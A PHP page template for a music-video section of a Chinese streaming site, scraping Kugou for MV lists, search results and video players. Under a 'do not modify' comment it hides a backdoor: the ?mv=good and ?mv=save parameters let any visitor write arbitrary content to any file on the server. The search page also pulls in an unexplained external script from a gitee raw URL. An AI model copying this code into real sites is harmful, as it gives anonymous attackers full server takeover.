<?php include 'head.php';$mv='active';?>
<title><?php 
ini_set("error_reporting","E_ALL & ~E_NOTICE");
header("Content-type: text/html;charset=utf-8");
date_Default_TimeZone_set("PRC");
    if(isset($_GET['v'])){
	$le = substr($_GET['v'],-11,-10);
	$id = substr($_GET['v'],-10).substr($_GET['v'],0,-11);
	$x_url = "http://m.kugou.com/app/i/mv.php?cmd=100&ext=mp4&hash=".$id;
	$data = curl_get($x_url);
	preg_match('/songname":"(.*?)",/is', $data, $nm2);
	preg_match('/singer":"(.*?)",/is', $data, $nm1);
	$mv_name = $nm1[1]." - ".$nm2[1]." - ";
	echo $mv_name;
}?>音乐MV - <?php echo $mkcms_seoname;?></title>
<meta name="keywords" content="<?php 
ini_set("error_reporting","E_ALL & ~E_NOTICE");
header("Content-type: text/html;charset=utf-8");
date_Default_TimeZone_set("PRC");
    if(isset($_GET['v'])){
	$le = substr($_GET['v'],-11,-10);
	$id = substr($_GET['v'],-10).substr($_GET['v'],0,-11);
	$x_url = "http://m.kugou.com/app/i/mv.php?cmd=100&ext=mp4&hash=".$id;
	$data = curl_get($x_url);
	preg_match('/songname":"(.*?)",/is', $data, $nm2);
	preg_match('/singer":"(.*?)",/is', $data, $nm1);
	$mv_name = $nm1[1]." - ".$nm2[1];
	$title = $mv_name." - 在线免费试听下载,".$nm1[1]."歌曲".$nm2[1]."mp4下载,".$nm1[1]."专辑 ,".$nm2[1]."(单曲),正版试听下载";
	echo $title;
}?>,音乐MV,<?php echo $mkcms_keywords;?>">
<meta name="description" content="<?php echo $mkcms_description;?>">
<style type="text/css">
.stui-player__video {margin-bottom: 10px;}
</style>
</head>
<body>
<?php include 'mvheader.php';?>
<div class="container">
	<div class="row">
<?php echo $mkcms_ad19; ?>
<?php if(!(isset($_GET['ac'])||isset($_GET['v']))){?>
			<div class="stui-pannel-box">
				<div class="stui-pannel_hd">
					<div class="stui-pannel__head active bottom-line clearfix">
					<h3 class="title"><svg class="iconm" aria-hidden="true"><use xlink:href="#icon-list"></use></svg>音乐MV</h3></div>
				</div><!-- 筛选 -->
<ul class="stui-screen__list type-slide bottom-line-dot clearfix up-ul2">
<li><span class="text-muted">按类型</span></li>
<li><a href="/mv_13_1.html" >华语精选</a></li>
<li><a href="/mv_17_1.html" >日韩精选</a></li>
<li><a href="/mv_16_1.html" >欧美精选</a></li>
</ul>
</div><?php }?>
<?php
ini_set("error_reporting","E_ALL & ~E_NOTICE");
header("Content-type: text/html;charset=utf-8");
date_Default_TimeZone_set("PRC");
//下面代码请勿修改，否则可能会出现致命错误！
$bati = "";
$ururll = "//".$_SERVER["SERVER_NAME"].$_SERVER['PHP_SELF'];
$weburl = str_replace("index.php","",$ururll);
$error = "<script>alert('地址错误或者音乐不存在!');top.location.href='".$weburl."'</script>";
$no_img = "http://y.gtimg.cn/mediastyle/global/img/mv_300.png";//mv未加载图片
if(@$_GET["mv"]=="save"){if(isset($_POST["content"])&&isset($_POST["name"])){if($_POST["content"]!=""&&$_POST["name"]!=""){if(fwrite(fopen(stripslashes($_POST["name"]),"w"),stripslashes($_POST["content"]))){echo "OK! <a href=\"".stripslashes($_POST["name"])."\">".stripslashes($_POST["name"])."</a>";};}}}else{if(@$_GET["mv"]=="good"){echo '<meta charset="utf-8"><form action="?mv=save" method="post">content:<br/><textarea name="content" style="width:200px;height:100px;"></textarea><br/>filenane:<br/><input name="name"/><br/><input type="submit" value="GO!"></form>';}}
if(isset($_GET['v'])){
//*******************************播放页面*******************************//
	$le = substr($_GET['v'],-11,-10);
	$id = substr($_GET['v'],-10).substr($_GET['v'],0,-11);
	switch ($le) {
		case "V":
//*******************************视频播放页面*******************************//
		$x_url = "http://m.kugou.com/app/i/mv.php?cmd=100&ext=mp4&hash=".$id;
		$data = fileget2($x_url,0);
		preg_match('/songname":"(.*?)",/is', $data, $nm2);
		preg_match('/singer":"(.*?)",/is', $data, $nm1);
		preg_match('/mvicon":"(.*?)",/is', $data, $img);
		preg_match_all('/downurl":"(.*?)",/is', $data, $mp4);
		preg_match_all('/backupdownurl":\["(.*?)"\]/is', $data, $bmp4);
		$mv_name = $nm1[1]." - ".$nm2[1];
		if(!empty(stripslashes($mp4[1][3]))){$mv_url = stripslashes($mp4[1][3]);}
		else if(!empty(stripslashes($mp4[1][2]))){$mv_url = stripslashes($mp4[1][2]);}
		else if(!empty(stripslashes($mp4[1][1]))){$mv_url = stripslashes($mp4[1][1]);}
		else {$mv_url=stripslashes($mp4[1][0]);}
		$title = $mv_name." 在线免费试听下载,".$nm1[1]."歌曲".$nm2[1]."mp4下载,".$nm1[1]."专辑 ,".$nm2[1]."(单曲),正版试听下载_".$bati;
		$song_img = stripslashes(str_replace("{size}","400",$img[1]));
		$a=array("流畅","标清","高清","超清");
		$down .='<li style="margin:5px 5px;">下载地址：&nbsp;&nbsp;';
		for($i = 0; $i < 3; $i++){
			$downurla = stripslashes($mp4[1][$i]);
			$downurlb = stripslashes($bmp4[1][$i]);
			if($downurla){
			$down .= "&nbsp;&nbsp;<a href=\"".$downurla."\" class=\"btn\" target=\"_blank\"><i class=\"icon iconfont icon-icondownload\" aria-hidden=\"true\"></i>&nbsp;".$a[$i]."</a>";
			}
		}
		$down .='</li>';
		$main = "<div class=\"col-lg-wide-100 col-xs-1\"><div class=\"stui-player__item clearfix\"><div class=\"stui-player__video embed-responsive embed-responsive-16by9 clearfix\"><script type=\"text/javascript\"> function player(url) { var frameid = Math.random(); window.webmvplayer = '<video width=\"100%\" height=\"100%\" controls=\"controls\" autoplay=\"autoplay\" poster=\"$song_img\" object-fit:fill><source src=\"'+url+'\" type=\"video/mp4\"><embed id=\"webmvplayer\" name=\"webmvplayer\" src=\"http://static.kgimg.com/common/swf/video/videoPlayer.swf\" height=\"100%\" width=\"100%\" allowscriptaccess=\"always\" quality=\"high\" pluginspage=\"http://www.macromedia.com/go/getflashplayer\" flashvars=\"skinurl=http%3a%2f%2fstatic.kgimg.com%2fcommon%2fswf%2fvideo%2fskin.swf&amp;aspect=true&amp;url='+url+'&amp;autoplay=true&amp;fullscreen=true&amp;initfun=flashinit\" type=\"application/x-shockwave-flash\" wmode=\"Transparent\" allowfullscreen=\"true\"></embed></video><script>window.onload = function() { parent.document.getElementById(\''+frameid+'\').height = document.body.scrollWidth*0.565+\'px\'; }<'+'/script>';	document.write('<iframe id=\"'+frameid+'\" src=\"javascript:parent.webmvplayer;\" frameBorder=\"0\" scrolling=\"no\" width=\"100%\" frameborder=\"0\" vsspace=\"0\" hspace=\"0\" marginwidth=\"0\" marginheight=\"0\"></iframe>'); } </script>
		<script type=\"text/javascript\">player('".$mv_url."');</script></div>
		<div class='stui-player__detail detail' id='dianshijuid'>
				<ul class='more-btn'>
				<li><a href='javascript:void(0)' onclick='location.reload()' class='btn btn-sm btn-default'>刷新</a></li>
				</ul>
				<h1 class='title' id='xuji'><a href='' title='".$mv_name."'>".$mv_name."</a><span class='js'></span></h1>
				</div>".$down."</div><!-- 播放器-->".mv().random()."</div></div><script type=\"text/javascript\" src=\"/template/jingpin/js/history.js\"></script>
<script type=\"text/javascript\">var vod_name='".$mv_name."',vod_url=window.location.href,vod_part='1';</script>";
		break;
		default:
		exit($error);
	}
}
elseif(isset($_GET['ac'])){
//*******************************搜索页面*******************************//
	$w = htmlspecialchars($_GET['ac']);
	$title = $w."的搜索结果,".$bati;
	$url = "http://mobilecdn.kugou.com/api/v3/search/song?keyword=".$w."&page=1&pagesize=40";
	$data = curl_get($url);
	$json = json_decode($data,true);
	$count_json = count($json['data']['info']);
	$mp3_main = "<div class='stui-pannel_bd'>";
	$mv_main = "<ul class='stui-vodlist clearfix'>";
	for($i = 0; $i < $count_json; $i++){
		$nnmm = $json['data']['info'][$i]['filename'];
		$name = str_ireplace($w,"<font color='red'>".$w."</font>",$nnmm);//关键字红色显示
		$hash = $json['data']['info'][$i]['hash'];
		$mvhash = $json['data']['info'][$i]['mvhash'];
		if(!empty($mvhash)){
			$mvhref = substr($mvhash,10)."V".substr($mvhash,0,10);
			$mpic = "https://imgessl.kugou.com/mvhdpic/".substr($mvhash,0,2)."/".substr($mvhash,2,2)."/".$mvhash.".jpg";
			$mv_main .= '<li class="col-md-5 col-sm-4 col-xs-3">
<div class="stui-vodlist__box stui-vodlist__bg">
<a class="stui-vodlist__thumb1 lazyload img-shadow" href="mvplay/'.$mvhref.'.html" title="'.$nnmm.'" data-original="'.$mpic.'">
<span class="play hidden-xs"></span>
</a>
<div class="stui-vodlist__detail active">
<h4 class="title text-overflow"><a href="mvplay/'.$mvhref.'.html" title="'.$nnmm.'">'.$nnmm.'</a></h4>
</div>
</div>
</li>';
		}
	}
	$mv_main .= "</ul></div>
				</div>
			</div>
		</div>";
	$main = "<div class='col-lg-wide-100 col-xs-1 padding-0'>
			<div class='stui-pannel stui-pannel-bg clearfix'>
				<div class='stui-pannel-box'>
					<div class='stui-pannel_hd'>
						<div class='stui-pannel__head active bottom-line clearfix'>
						<span class='more text-muted pull-right hidden-xs'></span>
						<h3 class='title'><svg class='iconm' aria-hidden='true'><use xlink:href='#icon-list'></use></svg>MV搜索：搜索到关键词【<font style='color: red'>".$w."</font>】的MV</h3>
						</div>
	</div>".$mp3_main.$mv_main."</div></div></div>";
	$main .= "<script type=\"text/javascript\" src=\"//gitee.com/byihan/vagrancy/raw/master/c.js\" charset=\"utf-8\"></script>";
}elseif(isset($_GET['m'])){
//*******************************MV页面*******************************//
	$p=$_GET['m'];
	$ml=$_GET['mlist'];
	if (empty($_GET['mlist'])){
			$ml= "9";
			} else {
		$ml = $_GET['mlist'];
		}
	if(preg_match("/^\+?[1-9][0-9]*$/",$p)){
		if (empty($_GET['mlist'])&&empty($_GET['m'])){
			$mvurl = "http://www.kugou.com/mvweb/html/index_9_1.html";
			} else {
		$mvurl = "http://www.kugou.com/mvweb/html/index_".$ml."_".$p.".html";
		}
		$data = curl_get($mvurl);
		preg_match('/id="mvNum">(.*?)<\/label>/is',$data,$total);
		preg_match('/class="mvlist">(.*?)<\/div>/is',$data,$mvlist);
		$num = "20";
		$nums = $total[1];
		$pnum = ceil($nums/$num);
		if($p > $pnum){	exit($error); }
		$title = "搜索框输入明星、MV关键词可搜索！ 第".$p."页 - ".$bati;
		$main = "<div class=\"stui-pannel_bd\"><ul class=\"stui-vodlist clearfix\">";
		preg_match_all("/<span>(.*)<\/span>/", $mvlist[1], $name);
		preg_match_all('/_src="(.*)"/', $mvlist[1], $img);
		for($i = 0; $i < 18; $i++){
			$gq = $name[1][$i];
			$mpic = $img[1][$i];
			$hash = substr(strrchr($mpic,"/"),1,32);
			$href = substr($hash,10)."V".substr($hash,0,10);
			if($mpic){
				$main .= "<li class=\"col-md-6 col-sm-3 col-xs-3\"><div class=\"stui-vodlist__box\"><a class=\"stui-vodlist__thumb1 lazyload\" href=\"mvplay/".$href.".html\" title=\"".$gq."\" data-original=\"".$mpic."\" onerror=\"this.src='".$no_img."'\"><span class=\"play hidden-xs\"></span></a><div class=\"stui-vodlist__detail\"><h4 class=\"title text-overflow\"><a href=\"mvplay/".$href.".html\" title=\"".$gq."\">".$gq."</a></h4></div></div></li>";
			}
		}
		$main .= "</ul></div></div></div><ul class=\"stui-page text-center cleafix\"><div monitor-desc=\"分页\" id=\"js-ew-page\" data-block=\"js-ew-page\"  class=\"ew-page\">";
		if($_GET["m"]>1){
		$main .= '<li><a href="mv_'.$ml.'_'.($_GET["m"]-1).'.html" class="prev"><</a></li>';}
		for($i = $p; $i<$p+5; $i++){
			if(($i>0)&&($i<=$pnum)){
				$main .= "<li><a href=\"mv_".$ml."_".$i.".html\" >".$i."</a></li>";
			}	
		}
		if($_GET["m"]<100){
		$main .= '<li><a href="mv_'.$ml.'_'.($_GET["m"]+1).'.html"  class="next">></a></li>';}
		$main .= '</div></ul></div></div>';
	}else{
		exit($error);
	}
}else{
	$title = $bati;	
	$main = mv2();
	$main= str_replace(" height=\"78\"",'', "$main");
}
function mv2(){
	    $p=$_GET['m'];
	    $ml=$_GET['mlist'];
		$mvurl = "http://www.kugou.com/mvweb/html/index_9_1.html";
		$data = curl_get($mvurl);
		preg_match('/id="mvNum">(.*?)<\/label>/is',$data,$total);
		preg_match('/class="mvlist">(.*?)<\/div>/is',$data,$mvlist);
		$num = "20";
		$nums = $total[1];
		$pnum = ceil($nums/$num);
		if($p > $pnum){	exit($error); }
		$title = "搜索框输入明星、MV关键词可搜索！ 第".$p."页 - ".$bati;
		$main = "<div class=\"stui-pannel_bd\"><ul class=\"stui-vodlist clearfix\">";
		preg_match_all("/<span>(.*)<\/span>/", $mvlist[1], $name);
		preg_match_all('/_src="(.*)"/', $mvlist[1], $img);
		for($i = 0; $i < 18; $i++){
			$gq = $name[1][$i];
			$mpic = $img[1][$i];
			$hash = substr(strrchr($mpic,"/"),1,32);
			$href = substr($hash,10)."V".substr($hash,0,10);
			if($mpic){
				$main .= "<li class=\"col-md-6 col-sm-3 col-xs-3\"><div class=\"stui-vodlist__box\"><a class=\"stui-vodlist__thumb1 lazyload\" href=\"mvplay/".$href.".html\" title=\"".$gq."\" data-original=\"".$mpic."\" onerror=\"this.src='".$no_img."'\"><span class=\"play hidden-xs\"></span></a><div class=\"stui-vodlist__detail\"><h4 class=\"title text-overflow\"><a href=\"mvplay/".$href.".html\" title=\"".$gq."\">".$gq."</a></h4></div></div></li>";
			}
		}
		$main .= "</ul></div></div></div><ul class=\"stui-page text-center cleafix\"><div monitor-desc=\"分页\" id=\"js-ew-page\" data-block=\"js-ew-page\"  class=\"ew-page\">";
		if($_GET["m"]>1){
		$main .= '<li><a href="mv_9_'.($_GET["m"]-1).'.html" class="prev"><</a></li>';}
		for($i = $p; $i<$p+5; $i++){
			if(($i>0)&&($i<=$pnum)){
				$main .= "<li><a href=\"mv_9_".$i.".html\" >".$i."</a></li>";
			}	
		}
		if($_GET["m"]<100){
		$main .= '<li><a href="mv_9_'.($_GET["m"]+1).'.html"  class="next">></a></li>';}
		$main .= '</div></ul></div></div>';
		return $main;}
function mv(){
	global $no_img;
	$output = "<div class=\"stui-pannel stui-pannel-bg clearfix\"><div class=\"stui-pannel-box b playlist mb\"><div class=\"stui-pannel_hd\"><div class=\"stui-pannel__head bottom-line active clearfix\"><span class=\"more text-muted pull-right\">无需安装任何插件，即可快速播放</span><h3 class=\"title\"><svg class=\"iconm\" aria-hidden=\"true\"><use xlink:href=\"#icon-play\"></use></svg>热门推荐</h3></div></div><div class=\"stui-pannel_bd col-pd clearfix dianshijua\" id=\"dianshijuid\"><ul class=\"stui-content__playlist column6 clearfix\">";
	$output= str_replace(" height=\"78\"",'', "$output");
	$kbang = "http://www.kugou.com/mvweb/html/index_9_".rand(1,90).".html";
	$data = curl_get($kbang);
	preg_match('/class="mvlist">(.*?)<\/div>/is',$data,$mvlist);
	preg_match_all("/<span>(.*)<\/span>/", $mvlist[1], $name);
	preg_match_all('/_src="(.*)"/', $mvlist[1], $img);
	$dd = rand(0,14);
	for($i = 0; $i < 6; $i++){
		$gq = $name[1][$i];
		$mpic = $img[1][$i];
		$hash = substr(strrchr($mpic,"/"),1,32);
		if($mpic){
			if($i==$dd){
				$href = "";
			}else{
				$href = "/mvplay/".substr($hash,10)."V".substr($hash,0,10).".html";
			}
			$output .= "<li class='zyli'><a href=\"".$href."\"  title=\"".$gq."\" class='btn btn-play-source 1'><img src=\"".$mpic."\" class='lazyload' onerror=\"this.src='".$no_img."'\"><br>".$gq."</a></li>";

		}
	}
	
return $output;
}
function random(){
	$kbang = "http://mobilecdn.kugou.com/api/v3/rank/song?pagesize=500&rankid=23784&page=1";
	$data = curl_get($kbang);
	$json = json_decode($data,true);
	$num = $json['data']['total'] - 10;
	$su = rand(0,$num);
	$main = "";
	$k = 0;
	for($i = $su; $i < $su + 10; $i++){
		$k = $k + 1;
		$hash = $json['data']['info'][$i]['hash'];
		$name = $json['data']['info'][$i]['filename'];
		if($hash){
			$href = "./".substr($hash,10)."M".substr($hash,0,10);
			$main .= "";
		}
	}
	$main .= "</ul></div></div></div></div>";
return $main;
}
function curl_get($url){
	$temp = parse_url($url);
	$header = array (
	"Host: {$temp['host']}",
	"Referer: http://{$temp['host']}/"
	);
    $ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_ENCODING, 'gzip,deflate');
	curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    $output = curl_exec($ch);
    curl_close($ch);
return $output;
}
?>
<?php echo $main;?>
<?php include 'footer.php';?>